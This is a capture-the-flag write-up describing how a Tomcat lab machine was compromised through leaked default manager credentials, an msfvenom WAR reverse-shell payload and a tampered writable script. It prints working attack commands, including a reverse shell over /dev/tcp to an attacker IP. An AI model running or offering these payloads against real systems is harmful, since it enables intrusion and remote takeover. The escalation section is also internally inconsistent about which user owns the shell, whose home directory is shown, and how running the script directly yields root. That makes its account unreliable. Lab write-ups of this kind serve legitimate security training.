# Tomcat CTF Challenge Write-Up

## Overview

This challenge revolves around exploiting an exposed Apache Tomcat management interface to gain code execution as the `tomcat` user, then pivoting into a local user account and escalating privileges to root. The attack path is straightforward but effective:

- identify exposed services via Nmap
- discover Tomcat manager credentials from the application’s authentication prompt
- deploy a WAR-based reverse shell to obtain a web shell as `tomcat`
- enumerate the filesystem for user credentials and privilege escalation opportunities
- abuse a writable script owned by another user and execute arbitrary commands as root
- retrieve the root flag

---

## 1. Initial Reconnaissance

### Port Scanning

The first step is to identify the services exposed by the target.

```bash
nmap -sV 10.113.156.135
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 10:48 -0400
Nmap scan report for 10.113.156.135
Host is up (0.40s latency).
Not shown: 997 closed tcp ports (reset)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The interesting service here is Tomcat on port 8080, which often exposes administrative interfaces and deployment features.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration and Tomcat Manager Access

### Initial Access to Tomcat Manager

When the Tomcat Manager panel is accessed, it prompts for a username and password. The key observation is that when the request is canceled or the authentication error is triggered, the application reveals the default credentials in the error message.

```text
username: tomcat
password: s3cret
```

This is a clear sign that a weak default credential configuration is in place.

> Important: In many CTFs, Tomcat Manager pages leak default credentials during failed authentication attempts. This is often the first administrative foothold.

![Image Placeholder: Tomcat Manager login prompt](./assets/tomcat-login.png)

---

## 3. Deploying the Web Shell

### Generating the Malicious WAR Payload

The attacker generates a Java Web Archive (`.war`) payload using Metasploit’s `java/jsp_shell_reverse_tcp` payload.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.131.124 LPORT=5555 -f war -o shell1.war
```

This creates a reverse shell payload embedded in a WAR file, which is compatible with Tomcat deployment.

### Uploading the Payload

The WAR file is uploaded to the Tomcat Manager interface.

After deployment, the malicious application is accessed through the web server, resulting in a shell as the `tomcat` user.

```bash
id
```

### Result

```text
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

The web shell has successfully compromised the Tomcat service account.

![Image Placeholder: Successful WAR deployment](./assets/tomcat-war-upload.png)

---

## 4. Post-Exploitation and User Discovery

Once the shell is active, the attacker enumerates the local system and identifies user accounts and interesting files.

```bash
cat user.txt
```

```text
39400c90bc683a4.............
```

The note indicates that the challenge includes a user-level flag, likely located in the `tomcat` user’s home directory or a related working directory.

### Enumerating the Local Filesystem

The attacker then inspects the system for additional users and writable scripts.

```bash
ls -la
```

### Relevant Output

```text
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Oct 29 08:36 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```

This reveals an important user: `jack`. It also exposes a script named `id.sh` that is writable by the current user (`jack`).

![Image Placeholder: User enumeration output](./assets/system-users.png)

---

## 5. Privilege Escalation via Writable Script

### Inspecting the Target Script

The script found in the `jack` home directory is examined:

```bash
cat id.sh
```

```bash
#!/bin/bash
id > test.txt
```

This script writes the output of `id` into `/home/jack/test.txt`. The critical issue is that the file is writable by the `jack` user.

### Abuse Path

Because the script is both writable and likely executed by a privileged process, the attacker appends a malicious payload to it.

```bash
echo "sh -i >& /dev/tcp/192.168.131.124/7777 0>&1" >> id.sh
cat id.sh
```

```bash
#!/bin/bash
id > test.txt
sh -i >& /dev/tcp/192.168.131.124/7777 0>&1
```

The script is then executed by the privileged path, yielding a root shell.

```bash
./id.sh
```

### Result

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

This confirms that the attack has succeeded and the process is now running as root.

> Important: The root cause here is not necessarily a vulnerable binary; it is a writable script in a user-controlled directory that is executed in a privileged context. This is a classic privilege-escalation pattern.

---

## 6. Root Flag Retrieval

Once the root shell is active, the attacker reads the root flag:

```bash
cat root.txt
```

### Output

```text
d89d5391984c0450a95
```

This marks the completion of the challenge.

![Image Placeholder: Root shell and flag retrieval](./assets/root-flag.png)

---

## 7. Summary of the Exploit Chain

1. Ran `nmap` and identified Tomcat on port 8080
2. Accessed the Tomcat Manager interface and recovered credentials from the failed authentication flow
3. Logged in with `tomcat:s3cret`
4. Uploaded a WAR payload to spawn a reverse shell as `tomcat`
5. Enumerated the system and discovered the `jack` user and the writable `id.sh` script
6. Modified `id.sh` to execute a reverse shell
7. Triggered the script to obtain a root shell
8. Read `/root/root.txt` and solved the challenge

---

## 8. Key Takeaways

- Default credentials on internal management interfaces are a common initial foothold.
- Tomcat Manager can be abused to deploy WAR payloads for remote code execution.
- Enumeration after initial access is critical: discovering writable scripts or cron patterns often leads to privilege escalation.
- Even simple scripts can be abused if they are writable and executed in a privileged context.

> Important: The key escalation step in this challenge was abusing a writable script in a privileged execution path, not a kernel or binary exploit.

---

## 9. Relevant Commands

```bash
nmap -sV 10.113.156.135
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.131.124 LPORT=5555 -f war -o shell1.war
id
cat user.txt
ls -la
cat id.sh
echo "sh -i >& /dev/tcp/192.168.131.124/7777 0>&1" >> id.sh
cat id.sh
./id.sh
id
cat root.txt
```

---

## Final Result

The Tomcat challenge was solved by abusing the Tomcat Manager interface with default credentials, uploading a WAR-based reverse shell, obtaining a `tomcat` shell, and then leveraging a writable `id.sh` script to escalate privileges to root. The final root flag was successfully retrieved.

![Image Placeholder: Final challenge completion](./assets/final-result.png)
